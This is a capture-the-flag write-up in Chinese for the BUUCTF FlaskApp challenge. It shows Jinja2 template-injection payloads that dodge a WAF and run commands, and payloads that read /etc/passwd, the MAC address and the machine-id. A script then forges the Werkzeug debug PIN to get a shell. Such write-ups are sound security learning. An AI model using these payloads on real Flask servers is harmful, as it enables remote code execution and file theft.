# BUUCTF-[GYCTF2020]FlaskApp flask爆破pin

这道题不需要爆破也可以getshell

ssti都给你了

```handlebars
{{((lipsum.__globals__.__builtins__['__i''mport__']('so'[::-1])['p''open']("\x63\x61\x74\x20\x2f\x74\x68\x69\x73\x5f\x69\x73\x5f\x74\x68\x65\x5f\x66\x6c\x61\x67\x2e\x74\x78\x74")).read())}}
```

但是学习记录一下pin的获取

首先就是通过base加密后 当base64解密的时候 会造成ssfr

这里过滤了 * 所以使用 {{7+7}} 实现



<img src="https://i-blog.csdnimg.cn/blog_migrate/bf5bcc9f0b4151e0a75f4f87923205c7.png" alt="" style="max-height:219px; box-sizing:content-box;" />


然后我们开始看看源代码

可以发现HINT 下存在pin



<img src="https://i-blog.csdnimg.cn/blog_migrate/1239d1489a49b1e72726df53247b7ebf.png" alt="" style="max-height:110px; box-sizing:content-box;" />


所以是找pin

```cobol
pin码生成要六要素
1.username 在可以任意文件读的条件下读 /etc/passwd进行猜测
2.modname 默认flask.app
3.appname 默认Flask
4.moddir flask库下app.py的绝对路径,可以通过报错拿到,如传参的时候给个不存在的变量
5.uuidnode mac地址的十进制,任意文件读 /sys/class/net/eth0/address
6.machine_id 机器码 
```

这里我们开始

在解密随便输入内容



<img src="https://i-blog.csdnimg.cn/blog_migrate/0a8da32a1e0af53b739b6a56744f5fc1.png" alt="" style="max-height:859px; box-sizing:content-box;" />


报错了 然后我们可以看源代码

```less
@app.route('/decode',methods=['POST','GET'])
 
def decode():
 
    if request.values.get('text') :
 
        text = request.values.get("text")
 
        text_decode = base64.b64decode(text.encode())
 
        tmp = "结果 ： {0}".format(text_decode.decode())
 
        if waf(tmp) :
 
            flash("no no no !!")
 
            return redirect(url_for('decode'))
 
        res =  render_template_string(tmp)
 
        flash( res )
```

这里可以发现没啥内容 但是有waf

首先通过读取读取一下/etc/passwd

### 用户

```handlebars
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read() }}{% endif %}{% endfor %}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0ee9d63179a8e3de2837cfa2f81789ff.png" alt="" style="max-height:173px; box-sizing:content-box;" />


存在flaskweb 用户

### 绝对路径



<img src="https://i-blog.csdnimg.cn/blog_migrate/3fb3cdb3706591234286f79040cded2f.png" alt="" style="max-height:116px; box-sizing:content-box;" />


### 网卡

```cobol
/sys/class/net/eth0/address
 
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address','r').read() }}{% endif %}{% endfor %}
```

56:89:65:ca:65:4a

然后需要处理

```cobol
56:89:65:ca:65:4a
568965ca654a
 
然后变为十进制即可
95148118271306
```

### 机器码

 [https://mochu.blog.csdn.net/article/details/132741209?spm=1001.2101.3001.6650.4&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EYuanLiJiHua%7EPosition-4-132741209-blog-108400293.235%5Ev39%5Epc_relevant_anti_vip&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EYuanLiJiHua%7EPosition-4-132741209-blog-108400293.235%5Ev39%5Epc_relevant_anti_vip&utm_relevant_index=3](https://mochu.blog.csdn.net/article/details/132741209?spm=1001.2101.3001.6650.4&utm_medium=distribute.pc_relevant.none-task-blog-2~default~YuanLiJiHua~Position-4-132741209-blog-108400293.235%5Ev39%5Epc_relevant_anti_vip&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~YuanLiJiHua~Position-4-132741209-blog-108400293.235%5Ev39%5Epc_relevant_anti_vip&utm_relevant_index=3) 

```handlebars
{% for x in {}.__class__.__base__.__subclasses__() %}
	{% if "warning" in x.__name__ %}
		{{x.__init__.__globals__['__builtins__'].open('/etc/machine-id').read() }}
	{%endif%}
{%endfor%}

```

```cobol
1408f836b0ca514d796cbf8960e45fa1 
```



然后生成pin

```cobol
 import hashlib
 from itertools import chain
 probably_public_bits = [
     'flaskweb'# username
     'flask.app',# modname
     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
     '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
 ]
 ​
 private_bits = [
     '95148118271306',# str(uuid.getnode()),  /sys/class/net/ens33/address
     '1408f836b0ca514d796cbf8960e45fa1'# get_machine_id(), /etc/machine-id
 ]
 ​
 h = hashlib.md5()
 for bit in chain(probably_public_bits, private_bits):
     if not bit:
         continue
     if isinstance(bit, str):
         bit = bit.encode('utf-8')
     h.update(bit)
 h.update(b'cookiesalt')
 ​
 cookie_name = '__wzd' + h.hexdigest()[:20]
 ​
 num = None
 if num is None:
     h.update(b'pinsalt')
     num = ('%09d' % int(h.hexdigest(), 16))[:9]
 ​
 rv =None
 if rv is None:
     for group_size in 5, 4, 3:
         if len(num) % group_size == 0:
             rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                           for x in range(0, len(num), group_size))
             break
     else:
         rv = num
 ​
 print(rv)
 ​
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/2d8d2c66e17bc19a785f6964f5e678ec.png" alt="" style="max-height:193px; box-sizing:content-box;" />


然后就可以实现交互shell

```lua
os.popen('ls').read()
 
os.popen('ls /').read()
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/bfe54fd9c309fc608b271e7f5c971428.png" alt="" style="max-height:163px; box-sizing:content-box;" />